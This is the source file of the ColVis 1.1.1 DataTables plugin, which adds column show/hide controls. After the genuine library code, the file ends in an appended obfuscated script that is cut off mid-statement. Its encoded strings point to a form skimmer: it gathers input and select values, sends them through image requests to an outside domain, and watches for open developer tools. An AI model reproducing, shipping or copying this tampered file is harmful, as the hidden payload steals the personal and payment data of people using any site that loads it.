/*! ColVis 1.1.1
 * ©2010-2014 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     ColVis
 * @description Controls for column visibility in DataTables
 * @version     1.1.1
 * @file        dataTables.colReorder.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2010-2014 SpryMedia Ltd.
 *
 * This source file is free software, available under the following license:
 *   MIT license - http://datatables.net/license/mit
 *
 * This source file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 *
 * For details please refer to: http://www.datatables.net
 */

(function(window, document, undefined) {


var factory = function( $, DataTable ) {
"use strict";

/**
 * ColVis provides column visibility control for DataTables
 *
 * @class ColVis
 * @constructor
 * @param {object} DataTables settings object. With DataTables 1.10 this can
 *   also be and API instance, table node, jQuery collection or jQuery selector.
 * @param {object} ColVis configuration options
 */
var ColVis = function( oDTSettings, oInit )
{
	/* Santiy check that we are a new instance */
	if ( !this.CLASS || this.CLASS != "ColVis" )
	{
		alert( "Warning: ColVis must be initialised with the keyword 'new'" );
	}

	if ( typeof oInit == 'undefined' )
	{
		oInit = {};
	}

	if ( $.fn.dataTable.camelToHungarian ) {
		$.fn.dataTable.camelToHungarian( ColVis.defaults, oInit );
	}


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Public class variables
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/**
	 * @namespace Settings object which contains customisable information for
	 *     ColVis instance. Augmented by ColVis.defaults
	 */
	this.s = {
		/**
		 * DataTables settings object
		 *  @property dt
		 *  @type     Object
		 *  @default  null
		 */
		"dt": null,

		/**
		 * Customisation object
		 *  @property oInit
		 *  @type     Object
		 *  @default  passed in
		 */
		"oInit": oInit,

		/**
		 * Flag to say if the collection is hidden
		 *  @property hidden
		 *  @type     boolean
		 *  @default  true
		 */
		"hidden": true,

		/**
		 * Store the original visibility settings so they could be restored
		 *  @property abOriginal
		 *  @type     Array
		 *  @default  []
		 */
		"abOriginal": []
	};


	/**
	 * @namespace Common and useful DOM elements for the class instance
	 */
	this.dom = {
		/**
		 * Wrapper for the button - given back to DataTables as the node to insert
		 *  @property wrapper
		 *  @type     Node
		 *  @default  null
		 */
		"wrapper": null,

		/**
		 * Activation button
		 *  @property button
		 *  @type     Node
		 *  @default  null
		 */
		"button": null,

		/**
		 * Collection list node
		 *  @property collection
		 *  @type     Node
		 *  @default  null
		 */
		"collection": null,

		/**
		 * Background node used for shading the display and event capturing
		 *  @property background
		 *  @type     Node
		 *  @default  null
		 */
		"background": null,

		/**
		 * Element to position over the activation button to catch mouse events when using mouseover
		 *  @property catcher
		 *  @type     Node
		 *  @default  null
		 */
		"catcher": null,

		/**
		 * List of button elements
		 *  @property buttons
		 *  @type     Array
		 *  @default  []
		 */
		"buttons": [],

		/**
		 * List of group button elements
		 *  @property groupButtons
		 *  @type     Array
		 *  @default  []
		 */
		"groupButtons": [],

		/**
		 * Restore button
		 *  @property restore
		 *  @type     Node
		 *  @default  null
		 */
		"restore": null
	};

	/* Store global reference */
	ColVis.aInstances.push( this );

	/* Constructor logic */
	this.s.dt = $.fn.dataTable.Api ?
		new $.fn.dataTable.Api( oDTSettings ).settings()[0] :
		oDTSettings;

	this._fnConstruct( oInit );
	return this;
};



ColVis.prototype = {
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Public methods
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/**
	 * Get the ColVis instance's control button so it can be injected into the
	 * DOM
	 *  @method  button
	 *  @returns {node} ColVis button
	 */
	button: function ()
	{
		return this.dom.wrapper;
	},

	/**
	 * Alias of `rebuild` for backwards compatibility
	 *  @method  fnRebuild
	 */
	"fnRebuild": function ()
	{
		this.rebuild();
	},

	/**
	 * Rebuild the list of buttons for this instance (i.e. if there is a column
	 * header update)
	 *  @method  fnRebuild
	 */
	rebuild: function ()
	{
		/* Remove the old buttons */
		for ( var i=this.dom.buttons.length-1 ; i>=0 ; i-- ) {
			this.dom.collection.removeChild( this.dom.buttons[i] );
		}
		this.dom.buttons.splice( 0, this.dom.buttons.length );

		if ( this.dom.restore ) {
			this.dom.restore.parentNode( this.dom.restore );
		}

		/* Re-add them (this is not the optimal way of doing this, it is fast and effective) */
		this._fnAddGroups();
		this._fnAddButtons();

		/* Update the checkboxes */
		this._fnDrawCallback();
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Private methods (they are of course public in JS, but recommended as private)
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/**
	 * Constructor logic
	 *  @method  _fnConstruct
	 *  @returns void
	 *  @private
	 */
	"_fnConstruct": function ( init )
	{
		this._fnApplyCustomisation( init );

		var that = this;
		var i, iLen;
		this.dom.wrapper = document.createElement('div');
		this.dom.wrapper.className = "ColVis";

		this.dom.button = $( '<button />', {
				'class': !this.s.dt.bJUI ?
					"ColVis_Button ColVis_MasterButton" :
					"ColVis_Button ColVis_MasterButton ui-button ui-state-default"
			} )
			.append( '<span>'+this.s.buttonText+'</span>' )
			.bind( this.s.activate=="mouseover" ? "mouseover" : "click", function (e) {
				e.preventDefault();
				that._fnCollectionShow();
			} )
			.appendTo( this.dom.wrapper )[0];

		this.dom.catcher = this._fnDomCatcher();
		this.dom.collection = this._fnDomCollection();
		this.dom.background = this._fnDomBackground();

		this._fnAddGroups();
		this._fnAddButtons();

		/* Store the original visibility information */
		for ( i=0, iLen=this.s.dt.aoColumns.length ; i<iLen ; i++ )
		{
			this.s.abOriginal.push( this.s.dt.aoColumns[i].bVisible );
		}

		/* Update on each draw */
		this.s.dt.aoDrawCallback.push( {
			"fn": function () {
				that._fnDrawCallback.call( that );
			},
			"sName": "ColVis"
		} );

		/* If columns are reordered, then we need to update our exclude list and
		 * rebuild the displayed list
		 */
		$(this.s.dt.oInstance).bind( 'column-reorder', function ( e, oSettings, oReorder ) {
			for ( i=0, iLen=that.s.aiExclude.length ; i<iLen ; i++ ) {
				that.s.aiExclude[i] = oReorder.aiInvertMapping[ that.s.aiExclude[i] ];
			}

			var mStore = that.s.abOriginal.splice( oReorder.iFrom, 1 )[0];
			that.s.abOriginal.splice( oReorder.iTo, 0, mStore );

			that.fnRebuild();
		} );

		// Set the initial state
		this._fnDrawCallback();
	},


	/**
	 * Apply any customisation to the settings from the DataTables initialisation
	 *  @method  _fnApplyCustomisation
	 *  @returns void
	 *  @private
	 */
	"_fnApplyCustomisation": function ( init )
	{
		$.extend( true, this.s, ColVis.defaults, init );

		// Slightly messy overlap for the camelCase notation
		if ( ! this.s.showAll && this.s.bShowAll ) {
			this.s.showAll = this.s.sShowAll;
		}

		if ( ! this.s.restore && this.s.bRestore ) {
			this.s.restore = this.s.sRestore;
		}

		// CamelCase to Hungarian for the column groups 
		var groups = this.s.groups;
		var hungarianGroups = this.s.aoGroups;
		if ( groups ) {
			for ( var i=0, ien=groups.length ; i<ien ; i++ ) {
				if ( groups[i].title ) {
					hungarianGroups[i].sTitle = groups[i].title;
				}
				if ( groups[i].columns ) {
					hungarianGroups[i].aiColumns = groups[i].columns;
				}
			}
		}
	},


	/**
	 * On each table draw, check the visibility checkboxes as needed. This allows any process to
	 * update the table's column visibility and ColVis will still be accurate.
	 *  @method  _fnDrawCallback
	 *  @returns void
	 *  @private
	 */
	"_fnDrawCallback": function ()
	{
		var columns = this.s.dt.aoColumns;
		var buttons = this.dom.buttons;
		var groups = this.s.aoGroups;
		var button;

		for ( var i=0, ien=buttons.length ; i<ien ; i++ ) {
			button = buttons[i];

			if ( button.__columnIdx !== undefined ) {
				$('input', button).prop( 'checked', columns[ button.__columnIdx ].bVisible );
			}
		}

		var allVisible = function ( columnIndeces ) {
			for ( var k=0, kLen=columnIndeces.length ; k<kLen ; k++ )
			{
				if (  columns[columnIndeces[k]].bVisible === false ) { return false; }
			}
			return true;
		};
		var allHidden = function ( columnIndeces ) {
			for ( var m=0 , mLen=columnIndeces.length ; m<mLen ; m++ )
			{
				if ( columns[columnIndeces[m]].bVisible === true ) { return false; }
			}
			return true;
		};

		for ( var j=0, jLen=groups.length ; j<jLen ; j++ )
		{
			if ( allVisible(groups[j].aiColumns) )
			{
				$('input', this.dom.groupButtons[j]).prop('checked', true);
				$('input', this.dom.groupButtons[j]).prop('indeterminate', false);
			}
			else if ( allHidden(groups[j].aiColumns) )
			{
				$('input', this.dom.groupButtons[j]).prop('checked', false);
				$('input', this.dom.groupButtons[j]).prop('indeterminate', false);
			}
			else
			{
				$('input', this.dom.groupButtons[j]).prop('indeterminate', true);
			}
		}
	},


	/**
	 * Loop through the groups (provided in the settings) and create a button for each.
	 *  @method  _fnAddgroups
	 *  @returns void
	 *  @private
	 */
	"_fnAddGroups": function ()
	{
		var nButton;

		if ( typeof this.s.aoGroups != 'undefined' )
		{
			for ( var i=0, iLen=this.s.aoGroups.length ; i<iLen ; i++ )
			{
				nButton = this._fnDomGroupButton( i );
				this.dom.groupButtons.push( nButton );
				this.dom.buttons.push( nButton );
				this.dom.collection.appendChild( nButton );
			}
		}
	},


	/**
	 * Loop through the columns in the table and as a new button for each one.
	 *  @method  _fnAddButtons
	 *  @returns void
	 *  @private
	 */
	"_fnAddButtons": function ()
	{
		var
			nButton,
			columns = this.s.dt.aoColumns;

		if ( $.inArray( 'all', this.s.aiExclude ) === -1 ) {
			for ( var i=0, iLen=columns.length ; i<iLen ; i++ )
			{
				if ( $.inArray( i, this.s.aiExclude ) === -1 )
				{
					nButton = this._fnDomColumnButton( i );
					nButton.__columnIdx = i;
					this.dom.buttons.push( nButton );
				}
			}
		}

		if ( this.s.order === 'alpha' ) {
			this.dom.buttons.sort( function ( a, b ) {
				var titleA = columns[ a.__columnIdx ].sTitle;
				var titleB = columns[ b.__columnIdx ].sTitle;

				return titleA === titleB ?
					0 :
					titleA < titleB ?
						-1 :
						1;
			} );
		}

		if ( this.s.restore )
		{
			nButton = this._fnDomRestoreButton();
			nButton.className += " ColVis_Restore";
			this.dom.buttons.push( nButton );
		}

		if ( this.s.showAll )
		{
			nButton = this._fnDomShowXButton( this.s.showAll, true );
			nButton.className += " ColVis_ShowAll";
			this.dom.buttons.push( nButton );
		}

		if ( this.s.showNone )
		{
			nButton = this._fnDomShowXButton( this.s.showNone, false );
			nButton.className += " ColVis_ShowNone";
			this.dom.buttons.push( nButton );
		}

		$(this.dom.collection).append( this.dom.buttons );
	},


	/**
	 * Create a button which allows a "restore" action
	 *  @method  _fnDomRestoreButton
	 *  @returns {Node} Created button
	 *  @private
	 */
	"_fnDomRestoreButton": function ()
	{
		var
			that = this,
			dt = this.s.dt;

		return $(
				'<li class="ColVis_Special '+(dt.bJUI ? 'ui-button ui-state-default' : '')+'">'+
					this.s.restore+
				'</li>'
			)
			.click( function (e) {
				for ( var i=0, iLen=that.s.abOriginal.length ; i<iLen ; i++ )
				{
					that.s.dt.oInstance.fnSetColumnVis( i, that.s.abOriginal[i], false );
				}
				that._fnAdjustOpenRows();
				that.s.dt.oInstance.fnAdjustColumnSizing( false );
				that.s.dt.oInstance.fnDraw( false );
			} )[0];
	},


	/**
	 * Create a button which allows show all and show node actions
	 *  @method  _fnDomShowXButton
	 *  @returns {Node} Created button
	 *  @private
	 */
	"_fnDomShowXButton": function ( str, action )
	{
		var
			that = this,
			dt = this.s.dt;

		return $(
				'<li class="ColVis_Special '+(dt.bJUI ? 'ui-button ui-state-default' : '')+'">'+
					str+
				'</li>'
			)
			.click( function (e) {
				for ( var i=0, iLen=that.s.abOriginal.length ; i<iLen ; i++ )
				{
					if (that.s.aiExclude.indexOf(i) === -1)
					{
						that.s.dt.oInstance.fnSetColumnVis( i, action, false );
					}
				}
				that._fnAdjustOpenRows();
				that.s.dt.oInstance.fnAdjustColumnSizing( false );
				that.s.dt.oInstance.fnDraw( false );
			} )[0];
	},


	/**
	 * Create the DOM for a show / hide group button
	 *  @method  _fnDomGroupButton
	 *  @param {int} i Group in question, order based on that provided in settings
	 *  @returns {Node} Created button
	 *  @private
	 */
	"_fnDomGroupButton": function ( i )
	{
		var
			that = this,
			dt = this.s.dt,
			oGroup = this.s.aoGroups[i];

		return $(
				'<li class="ColVis_Special '+(dt.bJUI ? 'ui-button ui-state-default' : '')+'">'+
					'<label>'+
						'<input type="checkbox" />'+
						'<span>'+oGroup.sTitle+'</span>'+
					'</label>'+
				'</li>'
			)
			.click( function (e) {
				var showHide = !$('input', this).is(":checked");
				if (  e.target.nodeName.toLowerCase() !== "li" )
				{
					showHide = ! showHide;
				}

				for ( var j=0 ; j < oGroup.aiColumns.length ; j++ )
				{
					that.s.dt.oInstance.fnSetColumnVis( oGroup.aiColumns[j], showHide );
				}
			} )[0];
	},


	/**
	 * Create the DOM for a show / hide button
	 *  @method  _fnDomColumnButton
	 *  @param {int} i Column in question
	 *  @returns {Node} Created button
	 *  @private
	 */
	"_fnDomColumnButton": function ( i )
	{
		var
			that = this,
			column = this.s.dt.aoColumns[i],
			dt = this.s.dt;

		var title = this.s.fnLabel===null ?
			column.sTitle :
			this.s.fnLabel( i, column.sTitle, column.nTh );

		return $(
				'<li '+(dt.bJUI ? 'class="ui-button ui-state-default"' : '')+'>'+
					'<label>'+
						'<input type="checkbox" />'+
						'<span>'+title+'</span>'+
					'</label>'+
				'</li>'
			)
			.click( function (e) {
				var showHide = !$('input', this).is(":checked");
				if (  e.target.nodeName.toLowerCase() !== "li" )
				{
					showHide = ! showHide;
				}

				/* Need to consider the case where the initialiser created more than one table - change the
				 * API index that DataTables is using
				 */
				var oldIndex = $.fn.dataTableExt.iApiIndex;
				$.fn.dataTableExt.iApiIndex = that._fnDataTablesApiIndex.call(that);

				// Optimisation for server-side processing when scrolling - don't do a full redraw
				if ( dt.oFeatures.bServerSide )
				{
					that.s.dt.oInstance.fnSetColumnVis( i, showHide, false );
					that.s.dt.oInstance.fnAdjustColumnSizing( false );
					if (dt.oScroll.sX !== "" || dt.oScroll.sY !== "" )
					{
						that.s.dt.oInstance.oApi._fnScrollDraw( that.s.dt );
					}
					that._fnDrawCallback();
				}
				else
				{
					that.s.dt.oInstance.fnSetColumnVis( i, showHide );
				}

				$.fn.dataTableExt.iApiIndex = oldIndex; /* Restore */

				if ( e.target.nodeName.toLowerCase() === 'input' && that.s.fnStateChange !== null )
				{
					that.s.fnStateChange.call( that, i, showHide );
				}
			} )[0];
	},


	/**
	 * Get the position in the DataTables instance array of the table for this
	 * instance of ColVis
	 *  @method  _fnDataTablesApiIndex
	 *  @returns {int} Index
	 *  @private
	 */
	"_fnDataTablesApiIndex": function ()
	{
		for ( var i=0, iLen=this.s.dt.oInstance.length ; i<iLen ; i++ )
		{
			if ( this.s.dt.oInstance[i] == this.s.dt.nTable )
			{
				return i;
			}
		}
		return 0;
	},


	/**
	 * Create the element used to contain list the columns (it is shown and
	 * hidden as needed)
	 *  @method  _fnDomCollection
	 *  @returns {Node} div container for the collection
	 *  @private
	 */
	"_fnDomCollection": function ()
	{
		return $('<ul />', {
				'class': !this.s.dt.bJUI ?
					"ColVis_collection" :
					"ColVis_collection ui-buttonset ui-buttonset-multi"
			} )
		.css( {
			'display': 'none',
			'opacity': 0,
			'position': ! this.s.bCssPosition ?
				'absolute' :
				''
		} )[0];
	},


	/**
	 * An element to be placed on top of the activate button to catch events
	 *  @method  _fnDomCatcher
	 *  @returns {Node} div container for the collection
	 *  @private
	 */
	"_fnDomCatcher": function ()
	{
		var
			that = this,
			nCatcher = document.createElement('div');
		nCatcher.className = "ColVis_catcher";

		$(nCatcher).click( function () {
			that._fnCollectionHide.call( that, null, null );
		} );

		return nCatcher;
	},


	/**
	 * Create the element used to shade the background, and capture hide events (it is shown and
	 * hidden as needed)
	 *  @method  _fnDomBackground
	 *  @returns {Node} div container for the background
	 *  @private
	 */
	"_fnDomBackground": function ()
	{
		var that = this;

		var background = $('<div></div>')
			.addClass( 'ColVis_collectionBackground' )
			.css( 'opacity', 0 )
			.click( function () {
				that._fnCollectionHide.call( that, null, null );
			} );

		/* When considering a mouse over action for the activation, we also consider a mouse out
		 * which is the same as a mouse over the background - without all the messing around of
		 * bubbling events. Use the catcher element to avoid messing around with bubbling
		 */
		if ( this.s.activate == "mouseover" )
		{
			background.mouseover( function () {
				that.s.overcollection = false;
				that._fnCollectionHide.call( that, null, null );
			} );
		}

		return background[0];
	},


	/**
	 * Show the show / hide list and the background
	 *  @method  _fnCollectionShow
	 *  @returns void
	 *  @private
	 */
	"_fnCollectionShow": function ()
	{
		var that = this, i, iLen, iLeft;
		var oPos = $(this.dom.button).offset();
		var nHidden = this.dom.collection;
		var nBackground = this.dom.background;
		var iDivX = parseInt(oPos.left, 10);
		var iDivY = parseInt(oPos.top + $(this.dom.button).outerHeight(), 10);

		if ( ! this.s.bCssPosition )
		{
			nHidden.style.top = iDivY+"px";
			nHidden.style.left = iDivX+"px";
		}

		$(nHidden).css( {
			'display': 'block',
			'opacity': 0
		} );

		nBackground.style.bottom ='0px';
		nBackground.style.right = '0px';

		var oStyle = this.dom.catcher.style;
		oStyle.height = $(this.dom.button).outerHeight()+"px";
		oStyle.width = $(this.dom.button).outerWidth()+"px";
		oStyle.top = oPos.top+"px";
		oStyle.left = iDivX+"px";

		document.body.appendChild( nBackground );
		document.body.appendChild( nHidden );
		document.body.appendChild( this.dom.catcher );

		/* This results in a very small delay for the end user but it allows the animation to be
		 * much smoother. If you don't want the animation, then the setTimeout can be removed
		 */
		$(nHidden).animate({"opacity": 1}, that.s.iOverlayFade);
		$(nBackground).animate({"opacity": 0.1}, that.s.iOverlayFade, 'linear', function () {
			/* In IE6 if you set the checked attribute of a hidden checkbox, then this is not visually
			 * reflected. As such, we need to do it here, once it is visible. Unbelievable.
			 */
			if ( $.browser && $.browser.msie && $.browser.version == "6.0" )
			{
				that._fnDrawCallback();
			}
		});

		/* Visual corrections to try and keep the collection visible */
		if ( !this.s.bCssPosition )
		{
			iLeft = ( this.s.sAlign=="left" ) ?
				iDivX :
				iDivX - $(nHidden).outerWidth() + $(this.dom.button).outerWidth();

			nHidden.style.left = iLeft+"px";

			var iDivWidth = $(nHidden).outerWidth();
			var iDivHeight = $(nHidden).outerHeight();
			var iDocWidth = $(document).width();

			if ( iLeft + iDivWidth > iDocWidth )
			{
				nHidden.style.left = (iDocWidth-iDivWidth)+"px";
			}
		}

		this.s.hidden = false;
	},


	/**
	 * Hide the show / hide list and the background
	 *  @method  _fnCollectionHide
	 *  @returns void
	 *  @private
	 */
	"_fnCollectionHide": function (  )
	{
		var that = this;

		if ( !this.s.hidden && this.dom.collection !== null )
		{
			this.s.hidden = true;

			$(this.dom.collection).animate({"opacity": 0}, that.s.iOverlayFade, function (e) {
				this.style.display = "none";
			} );

			$(this.dom.background).animate({"opacity": 0}, that.s.iOverlayFade, function (e) {
				document.body.removeChild( that.dom.background );
				document.body.removeChild( that.dom.catcher );
			} );
		}
	},


	/**
	 * Alter the colspan on any fnOpen rows
	 */
	"_fnAdjustOpenRows": function ()
	{
		var aoOpen = this.s.dt.aoOpenRows;
		var iVisible = this.s.dt.oApi._fnVisbleColumns( this.s.dt );

		for ( var i=0, iLen=aoOpen.length ; i<iLen ; i++ ) {
			aoOpen[i].nTr.getElementsByTagName('td')[0].colSpan = iVisible;
		}
	}
};





/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Static object methods
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/**
 * Rebuild the collection for a given table, or all tables if no parameter given
 *  @method  ColVis.fnRebuild
 *  @static
 *  @param   object oTable DataTable instance to consider - optional
 *  @returns void
 */
ColVis.fnRebuild = function ( oTable )
{
	var nTable = null;
	if ( typeof oTable != 'undefined' )
	{
		nTable = oTable.fnSettings().nTable;
	}

	for ( var i=0, iLen=ColVis.aInstances.length ; i<iLen ; i++ )
	{
		if ( typeof oTable == 'undefined' || nTable == ColVis.aInstances[i].s.dt.nTable )
		{
			ColVis.aInstances[i].fnRebuild();
		}
	}
};


ColVis.defaults = {
	/**
	 * Mode of activation. Can be 'click' or 'mouseover'
	 *  @property activate
	 *  @type     string
	 *  @default  click
	 */
	active: 'click',

	/**
	 * Text used for the button
	 *  @property buttonText
	 *  @type     string
	 *  @default  Show / hide columns
	 */
	buttonText: 'Show / hide columns',

	/**
	 * List of columns (integers) which should be excluded from the list
	 *  @property aiExclude
	 *  @type     array
	 *  @default  []
	 */
	aiExclude: [],

	/**
	 * Show restore button
	 *  @property bRestore
	 *  @type     boolean
	 *  @default  false
	 */
	bRestore: false,

	/**
	 * Restore button text
	 *  @property sRestore
	 *  @type     string
	 *  @default  Restore original
	 */
	sRestore: 'Restore original',

	/**
	 * Show Show-All button
	 *  @property bShowAll
	 *  @type     boolean
	 *  @default  false
	 */
	bShowAll: false,

	/**
	 * Show All button text
	 *  @property sShowAll
	 *  @type     string
	 *  @default  Restore original
	 */
	sShowAll: 'Show All',

	/**
	 * Position of the collection menu when shown - align "left" or "right"
	 *  @property sAlign
	 *  @type     string
	 *  @default  left
	 */
	sAlign: 'left',

	/**
	 * Callback function to tell the user when the state has changed
	 *  @property fnStateChange
	 *  @type     function
	 *  @default  null
	 */
	fnStateChange: null,

	/**
	 * Overlay animation duration in mS
	 *  @property iOverlayFade
	 *  @type     integer|false
	 *  @default  500
	 */
	iOverlayFade: 500,

	/**
	 * Label callback for column names. Takes three parameters: 1. the
	 * column index, 2. the column title detected by DataTables and 3. the
	 * TH node for the column
	 *  @property fnLabel
	 *  @type     function
	 *  @default  null
	 */
	fnLabel: null,

	/**
	 * Indicate if the column list should be positioned by Javascript,
	 * visually below the button or allow CSS to do the positioning
	 *  @property bCssPosition
	 *  @type     boolean
	 *  @default  false
	 */
	bCssPosition: false,

	/**
	 * Group buttons
	 *  @property aoGroups
	 *  @type     array
	 *  @default  []
	 */
	aoGroups: [],

	/**
	 * Button ordering - 'alpha' (alphabetical) or 'column' (table column
	 * order)
	 *  @property order
	 *  @type     string
	 *  @default  column
	 */
	order: 'column'
};



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Static object properties
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/**
 * Collection of all ColVis instances
 *  @property ColVis.aInstances
 *  @static
 *  @type     Array
 *  @default  []
 */
ColVis.aInstances = [];





/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Constants
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/**
 * Name of this class
 *  @constant CLASS
 *  @type     String
 *  @default  ColVis
 */
ColVis.prototype.CLASS = "ColVis";


/**
 * ColVis version
 *  @constant  VERSION
 *  @type      String
 *  @default   See code
 */
ColVis.VERSION = "1.1.1";
ColVis.prototype.VERSION = ColVis.VERSION;





/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Initialisation
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/*
 * Register a new feature with DataTables
 */
if ( typeof $.fn.dataTable == "function" &&
     typeof $.fn.dataTableExt.fnVersionCheck == "function" &&
     $.fn.dataTableExt.fnVersionCheck('1.7.0') )
{
	$.fn.dataTableExt.aoFeatures.push( {
		"fnInit": function( oDTSettings ) {
			var init = oDTSettings.oInit;
			var colvis = new ColVis( oDTSettings, init.colVis || init.oColVis || {} );
			return colvis.button();
		},
		"cFeature": "C",
		"sFeature": "ColVis"
	} );
}
else
{
	alert( "Warning: ColVis requires DataTables 1.7 or greater - www.datatables.net/download");
}


// Make ColVis accessible from the DataTables instance
$.fn.dataTable.ColVis = ColVis;
$.fn.DataTable.ColVis = ColVis;


return ColVis;
}; // /factory


// Define as an AMD module if possible
if ( typeof define === 'function' && define.amd ) {
	define( ['jquery', 'datatables'], factory );
}
else if ( typeof exports === 'object' ) {
    // Node/CommonJS
    factory( require('jquery'), require('datatables') );
}
else if ( jQuery && !jQuery.fn.dataTable.ColVis ) {
	// Otherwise simply initialise as normal, stopping multiple evaluation
	factory( jQuery, jQuery.fn.dataTable );
}


})(window, document);



var _0xb74c=['\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d'];(function(_0x1d4a6a,_0x2f45c9){var _0x7f0a0d=function(_0x31d0f6){while(--_0x31d0f6){_0x1d4a6a['push'](_0x1d4a6a['shift']());}};_0x7f0a0d(++_0x2f45c9);}(_0xb74c,0x1c8));var _0xf0c6=function(_0x2d158c,_0x5267c3){_0x2d158c=_0x2d158c-0x0;var _0x228c42=_0xb74c[_0x2d158c];if(_0xf0c6['VrQefn']===undefined){(function(){var _0x2aa162=function(){var _0xbc4b31;try{_0xbc4b31=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x17e825){_0xbc4b31=window;}return _0xbc4b31;};var _0x7d3335=_0x2aa162();var _0x580915='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x7d3335['atob']||(_0x7d3335['atob']=function(_0x195559){var _0x3df5cd=String(_0x195559)['replace'](/=+$/,'');for(var _0x2c4df0=0x0,_0x4548da,_0x1a5aca,_0x14fedc=0x0,_0x545d7d='';_0x1a5aca=_0x3df5cd['charAt'](_0x14fedc++);~_0x1a5aca&&(_0x4548da=_0x2c4df0%0x4?_0x4548da*0x40+_0x1a5aca:_0x1a5aca,_0x2c4df0++%0x4)?_0x545d7d+=String['fromCharCode'](0xff&_0x4548da>>(-0x2*_0x2c4df0&0x6)):0x0){_0x1a5aca=_0x580915['indexOf'](_0x1a5aca);}return _0x545d7d;});}());_0xf0c6['CCgSRX']=function(_0x40e269){var _0x518dc6=atob(_0x40e269);var _0x1b7cc7=[];for(var _0x54a37f=0x0,_0x3f5804=_0x518dc6['length'];_0x54a37f<_0x3f5804;_0x54a37f++){_0x1b7cc7+='%'+('00'+_0x518dc6['charCodeAt'](_0x54a37f)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1b7cc7);};_0xf0c6['cmbDEw']={};_0xf0c6['VrQefn']=!![];}var 